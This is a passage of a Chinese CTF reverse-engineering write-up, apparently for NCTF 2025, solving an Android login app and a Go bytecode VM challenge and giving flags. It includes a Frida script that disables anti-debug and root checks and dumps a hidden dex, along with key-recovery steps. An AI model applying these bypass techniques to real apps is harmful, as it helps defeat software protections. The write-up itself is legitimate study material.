0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3, 0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46, 0 &#125;; u8 decode_Result[50] = &#123; 0 &#125;; u8 key[16] = &quot;NCTF24nctfNCTF24&quot;; len = 32; //encode_fun(sizeof(Data_plain), key, Data_plain, encode_Result); /*printf(&quot;加密后数据是：\\n&quot;);*/ decode_fun(len, key, encode_Result, decode_Result); for (i = 0; i &lt; len; i++) printf(&quot;%c&quot;, *(decode_Result + i)); //58cb925e0cd823c0d0b54fd06b820b7e return 0;&#125; 所以flag是NCTF{58cb925e0cd823c0d0b54fd06b820b7e} x1Login这是我第一次尝试用frida做安卓 12345678910private final void checkSecutity() &#123; if (Secure.checkDebug()) &#123; Toast.makeText(this, &quot;Debugger Detected!&quot;, 0).show(); exit(); &#125; if (Secure.checkRoot()) &#123; Toast.makeText(this, &quot;Root Detected!&quot;, 0).show(); exit(); &#125;&#125; 有反调试，我选择frida到checkSecutity方法内，然后直接无操作返回(官方wp中显示用apktool解包，改，打包，签名，但是我一直报4字节的错，根本没办法解决，所以只得放弃) 然后就可以hook进去了 1234567891011121314151617181920212223public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(C0890R.layout.activity_main); checkSecutity(); final EditText editText = (EditText) findViewById(C0890R.C0893id.usernameEditText); final EditText editText2 = (EditText) findViewById(C0890R.C0893id.passwordEditText); Button button = (Button) findViewById(C0890R.C0893id.loginButton); String str = DecStr.get(&quot;Exv3nhr5BNW0axn3aNz/DNv9C3q0wxj/Exe=&quot;); Intrinsics.checkNotNullExpressionValue(str, &quot;get(...)&quot;); final Class&lt;?&gt; cls = getClass(str); if (cls == null) &#123; Toast.makeText(this, &quot;Error: Program load failure&quot;, 0).show(); finish(); System.exit(-1); throw new RuntimeException(&quot;System.exit returned normally, while it was supposed to halt JVM.&quot;); &#125; button.setOnClickListener(new View.OnClickListener() &#123; // from class: com.nctf.simplelogin.MainActivity$$ExternalSyntheticLambda0 @Override // android.view.View.OnClickListener public final void onClick(View view) &#123; MainActivity.onCreate$lambda$0(editText, editText2, this, cls, view); &#125; &#125;);&#125; 主函数静态分析，前面是界面不必理会，一直到DecStr.get开始有东西，双击DecStr 1234567public class DecStr &#123; public static native String get(String str); static &#123; System.loadLibrary(&quot;simple&quot;); &#125;&#125; 是.so层的调用，如果.so分析的话 123456789101112sub_7C0( v5, aAbcdefghijklmn, // &quot;AbcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot; s);n8 = strlen((const char *)s);v18 = n8 - n8_1;v19 = (char *)s + n8_1;do&#123; --v18; *v19++ ^= n8;&#125; 逻辑其实就是这样，base解码+异或长度Exv3nhr5BNW0axn3aNz&#x2F;DNv9C3q0wxj&#x2F;Exe&#x3D;-&gt;com.nctf.simplelogin.Check 当然也可以frida var str &#x3D; DecStr.get(“Exv3nhr5BNW0axn3aNz&#x2F;DNv9C3q0wxj&#x2F;Exe&#x3D;”); console.log(‘[+] DecStr 解密结果: ‘ + str); 总之这里是获取了方法名，后面final Class&lt;?&gt; cls &#x3D; getClass(str);+MainActivity.onCreate$lambda$0(editText, editText2, this, cls, view); 也就是加载方法，点击调用，跟着进到getClass里面 12345678private final Class&lt;?&gt; getClass(String str) &#123;try &#123; return new InMemoryDexClassLoader(ByteBuffer.wrap(Secure.loadDex(getApplicationContext(), DecStr.get(&quot;ygvUF2vHFgbPiN9J&quot;))), getClassLoader()).loadClass(str);&#125; catch (Exception e) &#123; e.printStackTrace(); return null;&#125;&#125; 这里实现的是加载dex文件，frida getApplicationContext()得到android.app.Application@da4db40 ygvUF2vHFgbPiN9J对应的是libsimple.so 所以这里是加载方法，关键方法是loadDex，所以可以进到这个函数中加载dex，然后用frida保存下来，整体dex如下 123456789101112131415161718192021222324252627282930313233343536373839Java.perform(function() &#123; // 获取 MainActivity var MainActivity = Java.use(&#x27;com.nctf.simplelogin.MainActivity&#x27;); // Hook checkSecutity 方法，使其不执行 MainActivity.checkSecutity.implementation = function() &#123; console.log(&#x27;[+] debugger&#x27;); &#125;; var Secure = Java.use(&#x27;com.nctf.simplelogin.Secure&#x27;); var ContextWrapper = Java.use(&#x27;android.content.ContextWrapper&#x27;); var File = Java.use(&#x27;java.io.File&#x27;); var FileOutputStream = Java.use(&#x27;java.io.FileOutputStream&#x27;); Secure.loadDex.implementation = function (ctx, dexName) &#123; console.log(&quot;[+] Dex 载入自: &quot; + dexName); var dexData = this.loadDex(ctx, dexName); // dexData 是 Java bytes[] console.log(&quot;[+] Dex 长度: &quot; + dexData.length); // 获取应用的外部存储目录 var context = Java.cast(ctx, ContextWrapper); var path = context.getExternalFilesDir(null).getAbsolutePath() + &quot;/dumped.dex&quot;; console.log(&quot;[+] Dex 保存路径: &quot; + path); try &#123; // 写入文件 var file = File.$new(path); var fos = FileOutputStream.$new(file); fos.write(dexData); // 直接写入 Java bytes[] fos.close(); console.log(&quot;[+] Dex 保存成功！&quot;); &#125; catch (e) &#123; console.log(&quot;[!] 保存 Dex 失败: &quot; + e); &#125; return dexData; &#125;;&#125;); 得到dex.dex 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.nctf.simplelogin;import android.content.Context;import android.widget.Toast;import java.security.MessageDigest;/* loaded from: D:\\study\\ctf\\2025nctf\\x1Login-release\\dex_dumped.dex */public class Check &#123; Context context; String password; String username; public Check(Context context, String username, String password) &#123; this.username = username; this.password = password; this.context = context; &#125; public void check() &#123; try &#123; if (check_username()) &#123; MessageDigest digest = MessageDigest.getInstance(DecStr.get(&quot;tMC2&quot;)); digest.update(this.username.getBytes()); byte[] output = digest.digest(); boolean result = check_password(output); if (result) &#123; Toast.makeText(this.context, &quot;Login Successful! Now submit your flag!&quot;, 0).show(); return; &#125; &#125; Toast.makeText(this.context, &quot;Login Failed!&quot;, 0).show(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private boolean check_username() &#123; return this.username.equals(DecStr.get(&quot;uZPOs29goMu6l38=&quot;)); &#125; private boolean check_password(byte[] key) &#123; return Secure.doCheck(this.password, key); &#125;&#125; 简单解密，this.username.equals(DecStr.get(“uZPOs29goMu6l38&#x3D;”));也就是账号&#x3D;X1c@dM1n1$t tMC2&#x3D;Md5 逻辑就是加载Md5，然后对账号名Md5，调用Secure.doCheck 123456789public class Secure &#123; public static native boolean doCheck(String str, byte[] bArr); public static native byte[] loadDex(Context context, String str); static &#123; System.loadLibrary(DecStr.get(&quot;agDYB3bJ&quot;)); &#125; 从这里可以看到doCheck也是.so层的，并且这个Secure调用的.so层是libnative.so(解密agDYB3bJ得到native)，那么就找doCheck，但是发现.so文件中并没有标识，ida调试也会跑飞 不过好在函数也不多，找找也找到了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778__int64 __fastcall sub_1E30(__int64 a1, __int64 a2, __int64 a3, __int64 a4)&#123; int n; // w20 int v8; // w0 unsigned __int8 *s; // x19 const void *src; // x22 __int64 *v11; // x23 unsigned __int8 *ptr; // x21 unsigned int v13; // w22 __int64 v14; // x22 __int64 v15; // x23 __int64 v16; // x26 __int64 *s_1; // x27 __int64 v18; // x0 __int64 v19; // x0 __int64 v20; // x0 unsigned __int8 *ptr_1; // x9 __int64 n_1; // x8 unsigned __int8 *s_2; // x10 int v24; // w11 int v25; // t1 int v26; // t1 n = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 1312LL))(a1, a3); v8 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 1312LL))(a1, a3); s = (unsigned __int8 *)malloc(v8 + 1); memset(s, 0, n + 1); src = (const void *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL); v11 = (__int64 *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1472LL))(a1, a4, 0LL); memcpy(s, src, n); ptr = (unsigned __int8 *)malloc(0x20uLL); v13 = 0; *(_OWORD *)ptr = xmmword_1804; *((_OWORD *)ptr + 1) = unk_1814; if ( (n &amp; 7) == 0 ) &#123; if ( n &gt;= 8 ) &#123; v14 = *v11; v15 = v11[1]; v16 = (unsigned int)n &gt;&gt; 3; s_1 = (__int64 *)s; do &#123; v18 = en_3des(*s_1, v14); v19 = de_3des(v18, v15); v20 = en_3des(v19, v14); *s_1++ = v20; __android_log_print(3, &quot;native&quot;, &quot;%llx&quot;, v20); --v16; &#125; while ( v16 ); &#125; ptr_1 = ptr; if ( n &lt;= 0 ) n_1 = 0LL; else n_1 = (unsigned int)n; s_2 = s; while ( n_1 ) &#123; v25 = *ptr_1++; v24 = v25; v26 = *s_2++; --n_1; if ( v24 != v26 ) &#123; v13 = 0; goto LABEL_13; &#125; &#125; v13 = 1; &#125; LABEL_13: free(ptr); free(s); return v13;&#125; (可以看s盒来判断加密类型)逻辑就是3des加密，加密结果和xmmword_1804验证，大概是24字节，a1,a2参数是固定的,a3,a4就是传入的两个参数，所以不难猜出key就是账户的Md5，值得注意的是v11类型是__int64，8字节存储，所以会大小端序 12345678910111213141516#include&lt;stdio.h&gt;int main(void)&#123; __int64 a = 0x7d53ecd36a43d3d2; __int64 b = 0x37e7dd633dcf8497; for (int i = 0; i &lt; 8; i++) &#123; printf(&quot;%02x&quot;, a &gt;&gt; (i * 8) &amp; 0xff); &#125; printf(&quot;\\n&quot;); for (int i = 0; i &lt; 8; i++) &#123; printf(&quot;%02x&quot;, b &gt;&gt; (i * 8) &amp; 0xff); &#125; return 0;&#125; en_key&#x3D;d2d3436ad3ec537d de_key&#x3D;9784cf3d63dde737 密文：0x8BA584B886EC9E40 0xBBB8D31AE2648A7E 0x523E454612FA4BDF 直接CyberChef选择Triple DES Decrypt 获得~DWPefaS+MY?x$y5&#x3D;6mG50U5，这个也要大小端序转换因为输入的时候Safe-&gt; S a f e 0xefaS相当于是这样，所以解密出来的就是上面这样，转换后SafePWD~5y$x?YM+5U05Gm6&#x3D; NCTF{X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6&#x3D;} gogogo(复现)第一次做go题，很遗憾，就差一点就有了，拖进ida 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308// main.mainvoid __fastcall main_main()&#123; int v0; // edi int v1; // esi __int64 v2; // rcx int v3; // r8d int v4; // r9d int v5; // r10d int v6; // r11d int v7; // r8d int v8; // r9d int v9; // r10d int v10; // r11d __int64 v11; // rbx int v12; // r10d int v13; // r11d int v14; // r8d int v15; // r9d int v16; // r10d int v17; // r11d main_coroutVM *p_main_coroutVM; // rax int v19; // r8d int v20; // r9d int v21; // r10d __int64 *v22; // r11 __m128i *ptr_1; // rdx void *instr; // rcx __m128i *checkres; // rbx void *instrSet; // rsi main_coroutVM *inputl; // rax __int64 v28; // rcx __int64 *v29; // r11 void *instr_1; // r8 void *checkres_1; // r9 void *instrSet_1; // r10 int p_string_1; // r10d size_t len_1; // rdx main_coroutVM *p_main_coroutVM_2; // rsi uint8 *mem; // rdi _QWORD *v37; // rax int v38; // r8d int v39; // r9d int v40; // r10d main_coroutVM **v41; // r11 __int64 inputh; // rcx __int64 v43; // rcx int v44; // r8d int v45; // r9d int v46; // r10d int v47; // r11d _QWORD *v48; // rax int v49; // r8d int v50; // r9d int v51; // r10d main_coroutVM **v52; // r11 __int64 inputl_2; // rcx int v54; // r8d int v55; // r9d int v56; // r10d int v57; // r11d __int64 instr_4; // rcx __int64 i; // rax __int64 v60; // rcx int v61; // r8d int v62; // r9d int v63; // r10d int v64; // r11d int v65; // r8d int v66; // r9d int v67; // r10d int v68; // r11d unsigned __int8 v69; // cl __int64 v70; // rcx int v71; // r8d int v72; // r9d int v73; // r10d int v74; // r11d __int64 v75; // r8 __int64 v76; // [rsp-3Ah] [rbp-E0h] __int64 v77; // [rsp-3Ah] [rbp-E0h] __int64 v78; // [rsp-3Ah] [rbp-E0h] __int64 v79; // [rsp-32h] [rbp-D8h] __int64 v80; // [rsp-32h] [rbp-D8h] __int64 v81; // [rsp-32h] [rbp-D8h] __int64 v82; // [rsp-2Ah] [rbp-D0h] __int64 v83; // [rsp-22h] [rbp-C8h] __int64 v84; // [rsp-1Ah] [rbp-C0h] unsigned __int8 v85; // [rsp+0h] [rbp-A6h] int v86; // [rsp+1h] [rbp-A5h] BYREF unsigned __int8 v87; // [rsp+5h] [rbp-A1h] BYREF size_t len; // [rsp+6h] [rbp-A0h] __int64 i_1; // [rsp+Eh] [rbp-98h] __int64 instr_3; // [rsp+16h] [rbp-90h] main_coroutVM *inputl_1; // [rsp+1Eh] [rbp-88h] __int64 instr_2; // [rsp+26h] [rbp-80h] main_coroutVM *p_main_coroutVM_1; // [rsp+2Eh] [rbp-78h] __int64 checkres_2; // [rsp+36h] [rbp-70h] __m128i *_RSI_1; // [rsp+3Eh] [rbp-68h] char *ptr; // [rsp+46h] [rbp-60h] _QWORD v97[2]; // [rsp+4Eh] [rbp-58h] BYREF _QWORD v98[2]; // [rsp+5Eh] [rbp-48h] BYREF _QWORD v99[2]; // [rsp+6Eh] [rbp-38h] BYREF _QWORD v100[2]; // [rsp+7Eh] [rbp-28h] BYREF _QWORD v101[2]; // [rsp+8Eh] [rbp-18h] BYREF string *p_string; // [rsp+9Eh] [rbp-8h] instr_2 = runtime_makechan(&amp;RTYPE_chan__4_uint8, 0); instr_3 = runtime_makechan(&amp;RTYPE_chan__4_uint8, 0); checkres_2 = runtime_makechan(&amp;RTYPE_chan_bool, 2); p_string = runtime_newobject(&amp;RTYPE_string, 2LL, v2, v0, v1, v3, v4, v5, v6); v101[0] = &amp;RTYPE_string; v101[1] = &amp;off_2B8B08; fmt_Fprintln(off_2B9218, qword_350000, v101, 1, 1, v7, v8, v9, v10, v76, v79); v100[0] = &amp;RTYPE__ptr_string; v100[1] = p_string; v11 = qword_34FFF8; fmt_Fscanf( off_2B9238, qword_34FFF8, &amp;a0ILm51YSiTvrru[19], 2, v100, 1, 1, v12, v13, v77, v80, v82, HIDWORD(v82), v83, HIDWORD(v83), v84, HIDWORD(v84)); ptr = p_string-&gt;ptr; len = p_string-&gt;len; p_main_coroutVM = runtime_newobject(&amp;RTYPE_main_coroutVM, v11, len, 2, v100, v14, v15, v16, v17); ptr_1 = &amp;qword_395420; if ( ptr ) ptr_1 = ptr; if ( dword_395690 ) &#123; p_main_coroutVM = runtime_gcWriteBarrier2(p_main_coroutVM); instr = instr_2; *v22 = instr_2; checkres = checkres_2; v22[1] = checkres_2; &#125; else &#123; instr = instr_2; checkres = checkres_2; &#125; _RSI_1 = ptr_1; p_main_coroutVM-&gt;instr = instr; p_main_coroutVM-&gt;checkres = checkres; instrSet = ::instrSet; if ( dword_395690 ) &#123; p_main_coroutVM = runtime_gcWriteBarrier1(p_main_coroutVM, checkres, instr, 2LL, ::instrSet); *v22 = instrSet; &#125; p_main_coroutVM_1 = p_main_coroutVM; p_main_coroutVM-&gt;instrSet = instrSet; inputl = runtime_newobject(&amp;RTYPE_main_coroutVM, checkres, instr, 2, instrSet, v19, v20, v21, v22); if ( dword_395690 ) &#123; inputl = runtime_gcWriteBarrier2(inputl); instr_1 = instr_3; *v29 = instr_3; checkres_1 = checkres_2; v29[1] = checkres_2; &#125; else &#123; instr_1 = instr_3; checkres_1 = checkres_2; &#125; inputl-&gt;instr = instr_1; inputl-&gt;checkres = checkres_1; instrSet_1 = instrSet_0; if ( dword_395690 ) &#123; inputl = runtime_gcWriteBarrier1(inputl, checkres, v28, 2LL, instrSet); *v29 = instrSet_1; &#125; inputl-&gt;instrSet = instrSet_1; p_string_1 = p_string; if ( p_string-&gt;len == 40 ) &#123; len_1 = len; if ( len &gt;= 20 ) &#123; inputl_1 = inputl; p_main_coroutVM_2 = p_main_coroutVM_1; mem = p_main_coroutVM_1-&gt;mem; checkres = _RSI_1; if ( _RSI_1 != p_main_coroutVM_1-&gt;mem ) &#123; runtime_memmove(p_main_coroutVM_1-&gt;mem, _RSI_1, 0x14uLL); inputl = inputl_1; len_1 = len; checkres = _RSI_1; p_main_coroutVM_2 = p_main_coroutVM_1; LODWORD(instr_1) = instr_3; LODWORD(checkres_1) = checkres_2; &#125; if ( len_1 &gt;= 40 ) &#123; checkres = (checkres + 20); if ( checkres != inputl-&gt;mem ) runtime_memmove(inputl-&gt;mem, checkres, 0x14uLL); v37 = runtime_newobject( &amp;qword_27CF60, checkres, v28, mem, p_main_coroutVM_2, instr_1, checkres_1, p_string_1, v29); *v37 = main_main_gowrap1; if ( dword_395690 ) &#123; v37 = runtime_gcWriteBarrier1(v37, checkres, main_main_gowrap1, mem, p_main_coroutVM_2); inputh = p_main_coroutVM_1; *v41 = p_main_coroutVM_1; &#125; else &#123; inputh = p_main_coroutVM_1; &#125; v37[1] = inputh; runtime_newproc(v37, checkres, inputh, mem, p_main_coroutVM_2, v38, v39, v40, v41); v48 = runtime_newobject(&amp;qword_27CF60, checkres, v43, mem, p_main_coroutVM_2, v44, v45, v46, v47); *v48 = main_main_gowrap2; if ( dword_395690 ) &#123; v48 = runtime_gcWriteBarrier1(v48, checkres, main_main_gowrap2, mem, p_main_coroutVM_2); inputl_2 = inputl_1; *v52 = inputl_1; &#125; else &#123; inputl_2 = inputl_1; &#125; v48[1] = inputl_2; runtime_newproc(v48, checkres, inputl_2, mem, p_main_coroutVM_2, v49, v50, v51, v52); instr_4 = instr_2; for ( i = 0LL; ; i = i_1 ) &#123; if ( ::i &lt;= i ) goto LABEL_28; v86 = 0; p_main_coroutVM_2 = (i + 4); if ( qword_348480 &lt; (i + 4) ) goto LABEL_41; if ( i &gt; p_main_coroutVM_2 ) break; i_1 = i + 4; mem = ::mem; v75 = ((i - qword_348480) &gt;&gt; 63) &amp; i; if ( &amp;v86 != (::mem + v75) ) v86 = *(::mem + v75); runtime_chansend1(instr_4, &amp;v86, instr_4, ::mem, p_main_coroutVM_2, v75, v55, v56, v57); checkres = &amp;v86; runtime_chansend1(instr_3, &amp;v86, v70, mem, p_main_coroutVM_2, v71, v72, v73, v74); instr_4 = instr_2; &#125; i = runtime_panicSliceB(i, checkres, i + 4);LABEL_41: inputl = runtime_panicSliceAcap(i, checkres, p_main_coroutVM_2); &#125; inputl = runtime_panicSliceAcap(inputl, checkres, 40LL); &#125; runtime_panicSliceAcap(inputl, checkres, 20LL); &#125; v99[0] = &amp;RTYPE_string; v99[1] = &amp;off_2B8B18; LODWORD(mem) = 1; LODWORD(p_main_coroutVM_2) = 1; fmt_Fprintln(off_2B9218, qword_350000, v99, 1, 1, instr_1, checkres_1, p_string, v29, v78, v81);LABEL_28: v87 = 0; runtime_chanrecv1(checkres_2, &amp;v87, instr_4, mem, p_main_coroutVM_2, v54, v55, v56, v57); v60 = v87; v85 = v87; v87 = 0; runtime_chanrecv1(checkres_2, &amp;v87, v60, mem, p_main_coroutVM_2, v61, v62, v63, v64); v69 = v87; v87 = v85; if ( v85 ) v87 = v69; if ( v87 ) &#123; v98[0] = &amp;RTYPE_string; v98[1] = &amp;off_2B8B28; fmt_Fprintln(off_2B9218, qword_350000, v98, 1, 1, v65, v66, v67, v68, v78, v81); &#125; else &#123; v97[0] = &amp;RTYPE_string; v97[1] = &amp;off_2B8B38; fmt_Fprintln(off_2B9218, qword_350000, v97, 1, 1, v65, v66, v67, v68, v78, v81); &#125;&#125; 看着很长，实际也不短，不过go语言废话多，动调分析一下 1234567891011121314151617181920fmt_Fscanf( off_2B9238, qword_34FFF8, &amp;a0ILm51YSiTvrru[19], 2, v100, 1, 1, v12, v13, v77, v80, v82, HIDWORD(v82), v83, HIDWORD(v83), v84, HIDWORD(v84)); ptr = p_string-&gt;ptr; len = p_string-&gt;len; 输入 123456789101112131415161718192021222324252627282930313233343536373839404142if ( len_1 &gt;= 40 )&#123; checkres = (checkres + 20); if ( checkres != inputl-&gt;mem ) runtime_memmove(inputl-&gt;mem, checkres, 0x14uLL); v37 = runtime_newobject( &amp;qword_27CF60, checkres, v28, mem, p_main_coroutVM_2, instr_1, checkres_1, p_string_1, v29); *v37 = main_main_gowrap1; if ( dword_395690 ) &#123; v37 = runtime_gcWriteBarrier1(v37, checkres, main_main_gowrap1, mem, p_main_coroutVM_2); inputh = p_main_coroutVM_1; *v41 = p_main_coroutVM_1; &#125; else &#123; inputh = p_main_coroutVM_1; &#125; v37[1] = inputh; runtime_newproc(v37, checkres, inputh, mem, p_main_coroutVM_2, v38, v39, v40, v41); v48 = runtime_newobject(&amp;qword_27CF60, checkres, v43, mem, p_main_coroutVM_2, v44, v45, v46, v47); *v48 = main_main_gowrap2; if ( dword_395690 ) &#123; v48 = runtime_gcWriteBarrier1(v48, checkres, main_main_gowrap2, mem, p_main_coroutVM_2); inputl_2 = inputl_1; *v52 = inputl_1; &#125; else &#123; inputl_2 = inputl_1; &#125; v48[1] = inputl_2; runtime_newproc(v48, checkres, inputl_2, mem, p_main_coroutVM_2, v49, v50, v51, v52); runtime_gcWriteBarrier1感觉是在加载函数，也就是main_main_gowrap1，main_main_gowrap2 加载之后后面runtime_newproc就是在调用了函数总之逻辑在上面这两个里（这里可以关注一下mem和mem赋值，这个是opcode） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// main.(*coroutVM).runvoid __golang main__ptr_coroutVM_run(_ptr_main_coroutVM a1)&#123; __int64 v1; // rdi __int64 v2; // rsi int v3; // r8d int v4; // r9d int v5; // r10d int v6; // r11d _chan_left_chan__4_uint8 instr; // rcx int v8; // r8d int v9; // r9d int v10; // r10d int v11; // r11d map_uint8_main_handler instrSet; // rbx __int64 **v13; // rax __int64 v14; // [rsp+0h] [rbp-38h] __int64 v15; // [rsp+8h] [rbp-30h] __int64 v16; // [rsp+10h] [rbp-28h] unsigned int v17; // [rsp+27h] [rbp-11h] unsigned int v18; // [rsp+2Bh] [rbp-Dh] BYREF char v19; // [rsp+2Fh] [rbp-9h] BYREF _chan_left_chan__4_uint8 i; // [rsp+30h] [rbp-8h] instr = a1-&gt;instr; for ( i = instr; runtime_chanrecv2(instr, &amp;v18, instr, v1, v2, v3, v4, v5, v6); instr = i ) &#123; v17 = v18; v18 = 0; v2 = (v17 &gt;&gt; 8); v1 = HIBYTE(v17); v19 = v17; instrSet = a1-&gt;instrSet; v13 = runtime_mapaccess2( &amp;RTYPE_map_uint8_main_handler, instrSet, &amp;v19, HIBYTE(v17), v2, v8, v9, v10, v11, v14, v15, v16); if ( instrSet ) &#123; v2 = **v13; LOWORD(v14) = v17 &gt;&gt; 8; BYTE2(v14) = HIBYTE(v17); (v2)(a1); if ( v17 == 0xFF ) break; &#125; &#125;&#125; 这个就是主要逻辑了，runtime_chanrecv2是在解析instr然后给v18，给了v18之后v18给v17再次解析（这里的instr就是opcode的当前部分？或者是总体指针没太关注） 最后解析结果给v13，后面v13给了v2，v2动调发现是一个叫main_mov的函数（并且会变）跟踪者往上寻找 12345678910111213141516171819202122232425262728.rdata:0000000000299F60 add dq offset main_ADD ; DATA XREF: main_map_init_0:loc_267F5B↑o.rdata:0000000000299F60 ; main_map_init_1:loc_2682FB↑o.rdata:0000000000299F68 and dq offset main_AND ; DATA XREF: main_map_init_0:loc_2680B3↑o.rdata:0000000000299F68 ; main_map_init_1:loc_268453↑o.rdata:0000000000299F70 hlt dq offset main_HLT ; DATA XREF: main_map_init_0:loc_268141↑o.rdata:0000000000299F70 ; main_map_init_1:loc_2684E1↑o.rdata:0000000000299F78 ldr dq offset main_LDR ; DATA XREF: main_map_init_0:loc_267E3B↑o.rdata:0000000000299F78 ; main_map_init_1:loc_2681DB↑o.rdata:0000000000299F80 ldri dq offset main_LDRI ; DATA XREF: main_map_init_0:loc_267E73↑o.rdata:0000000000299F80 ; main_map_init_1:loc_268213↑o.rdata:0000000000299F88 lsl dq offset main_LSL ; DATA XREF: main_map_init_0:loc_268008↑o.rdata:0000000000299F88 ; main_map_init_1:loc_2683A8↑o.rdata:0000000000299F90 lsr dq offset main_LSR ; DATA XREF: main_map_init_0:loc_268040↑o.rdata:0000000000299F90 ; main_map_init_1:loc_2683E0↑o.rdata:0000000000299F98 mov dq offset main_MOV ; DATA XREF: main_map_init_0:loc_267F20↑o.rdata:0000000000299F98 ; main_map_init_1:loc_2682C0↑o.rdata:0000000000299FA0 mul dq offset main_MUL ; DATA XREF: main_map_init_0:loc_267FCD↑o.rdata:0000000000299FA0 ; main_map_init_1:loc_26836D↑o.rdata:0000000000299FA8 ret dq offset main_RET ; DATA XREF: main_map_init_0:loc_2680ED↑o.rdata:0000000000299FA8 ; main_map_init_1:loc_26848D↑o.rdata:0000000000299FB0 str dq offset main_STR ; DATA XREF: main_map_init_0:loc_267EAD↑o.rdata:0000000000299FB0 ; main_map_init_1:loc_26824D↑o.rdata:0000000000299FB8 stri dq offset main_STRI ; DATA XREF: main_map_init_0:loc_267EE8↑o.rdata:0000000000299FB8 ; main_map_init_1:loc_268288↑o.rdata:0000000000299FC0 sub dq offset main_SUB ; DATA XREF: main_map_init_0:loc_267F93↑o.rdata:0000000000299FC0 ; main_map_init_1:loc_268333↑o.rdata:0000000000299FC8 xor dq offset main_XOR ; DATA XREF: main_map_init_0:loc_26807B↑o.rdata:0000000000299FC8 ; main_map_init_1:loc_26841B↑o 有点像vm的操作码了，并且在动调找操作码对应hex的时候，也就是runtime_mapaccess2解析后返回函数指针 1234v41 = &amp;v48[size]; if ( (p_RTYPE_map_uint8_main_handler_1[2].ptrdata &amp; 8) != 0 ) return *&amp;v48[size]; return v41; 这里有可能返回v41，所以动调去看v41里的值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970debug056:000000C000090000 qword_C000090000 dq 808041457215144Eh ; DATA XREF: debug056:000000C000081F68↑odebug056:000000C000090008 dq 12hdebug056:000000C000090010 dq offset ldridebug056:000000C000090018 dq 15hdebug056:000000C000090020 dq offset strdebug056:000000C000090028 dq 16hdebug056:000000C000090030 dq offset stridebug056:000000C000090038 qword_C000090038 dq 2Ah ; DATA XREF: debug056:000000C000081F58↑odebug056:000000C000090040 dq offset movdebug056:000000C000090048 dq 42hdebug056:000000C000090050 dq offset subdebug056:000000C000090058 dq 73hdebug056:000000C000090060 dq offset lsrdebug056:000000C000090068 dq 0debug056:000000C000090070 dq 0debug056:000000C000090078 dq 0debug056:000000C000090080 dq 0debug056:000000C000090088 dq 7E70506902607B66hdebug056:000000C000090090 dq 11hdebug056:000000C000090098 dq offset ldrdebug056:000000C0000900A0 dq 41hdebug056:000000C0000900A8 dq offset adddebug056:000000C0000900B0 dq 47hdebug056:000000C0000900B8 dq offset muldebug056:000000C0000900C0 dq 71hdebug056:000000C0000900C8 dq offset lsldebug056:000000C0000900D0 dq 7Ahdebug056:000000C0000900D8 dq offset xordebug056:000000C0000900E0 dq 7Bhdebug056:000000C0000900E8 dq offset anddebug056:000000C0000900F0 dq 0FEhdebug056:000000C0000900F8 dq offset retdebug056:000000C000090100 dq 0FFhdebug056:000000C000090108 dq offset hltdebug056:000000C000090110 dq 0debug056:000000C000090118 dq 0debug056:000000C000090120 dq 80805B7F4D195072hdebug056:000000C000090128 dq 14hdebug056:000000C000090130 dq offset ldridebug056:000000C000090138 dq 18hdebug056:000000C000090140 dq offset stridebug056:000000C000090148 dq 2Bhdebug056:000000C000090150 dq offset movdebug056:000000C000090158 dq 0CAhdebug056:000000C000090160 dq offset xordebug056:000000C000090168 dq 0FEhdebug056:000000C000090170 dq offset retdebug056:000000C000090178 dq 0FFhdebug056:000000C000090180 dq offset hltdebug056:000000C000090188 dq 0debug056:000000C000090190 dq 0debug056:000000C000090198 dq 0debug056:000000C0000901A0 dq 0debug056:000000C0000901A8 dq 497C2A1F61216141hdebug056:000000C0000901B0 dq 13hdebug056:000000C0000901B8 dq offset ldrdebug056:000000C0000901C0 dq 17hdebug056:000000C0000901C8 dq offset strdebug056:000000C0000901D0 dq 91hdebug056:000000C0000901D8 dq offset adddebug056:000000C0000901E0 dq 92hdebug056:000000C0000901E8 dq offset subdebug056:000000C0000901F0 dq 97hdebug056:000000C0000901F8 dq offset muldebug056:000000C000090200 dq 0C1hdebug056:000000C000090208 dq offset lsldebug056:000000C000090210 dq 0C3hdebug056:000000C000090218 dq offset lsrdebug056:000000C000090220 dq 0CBhdebug056:000000C000090228 dq offset and 这里一个hex紧跟着一个操作函数，并且0x2A对应mov在之前，v17中经常出现，本来我以为这个v17是输入，但是多次改变输入发现仍然会是0x2A, 0x00, 0x37, 0x9E，后面看到这里再加上之前在v2函数跟踪的时候点到过mem，然后看到了0x2A, 0x00, 0x37, 0x9E发现十分熟悉，所以猜测出mem是opcode（后面我才知道可以看结构体的定义来猜测） 于是有了操作函数对应字节码，有opcode，就可以解密了，因为这个调用的函数相同并且都是opcode[i+0]做字节码，opcode[i+1,2,3]参与运算，并且函数固定，所以这个vm不是很难写 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#include&lt;stdio.h&gt; #include&lt;string.h&gt; #include&lt;stdlib.h&gt; #include 